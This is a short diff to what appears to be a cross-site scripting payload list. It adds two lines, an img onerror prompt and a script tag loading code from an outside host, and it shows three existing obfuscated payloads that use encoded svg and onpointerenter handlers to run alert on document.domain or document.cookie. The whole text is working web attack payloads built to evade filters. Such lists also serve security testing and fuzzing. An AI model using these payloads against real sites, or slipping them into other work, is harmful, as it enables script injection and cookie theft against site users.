@@ -1,3 +1,5 @@
+"><iMg sRC=p onERror=prompt(document.dOmAin) x>
+<script/src=//ab.cd> 
 \"><%53Vg/%4FNLOaD%64=%61ler%26%23116;("document.cookie")%3E
 abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
 %3Csvg%20onpointerenter=z=alert,z(document.domain)%3E
